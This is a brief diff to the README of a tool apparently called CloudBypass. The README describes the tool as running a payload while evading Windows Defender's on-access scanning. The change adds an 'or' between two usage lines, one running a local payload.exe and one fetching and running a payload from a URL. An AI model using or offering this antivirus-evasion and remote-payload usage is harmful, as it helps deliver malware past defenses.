@@ -15,6 +15,9 @@ Executes a payload bypassing Windows Defender on-access scanning.
 ## Usage
 
 CloudBypass.exe <payload.exe>
+
+or
+
 CloudBypass.exe https://url/payload.dat
 
 
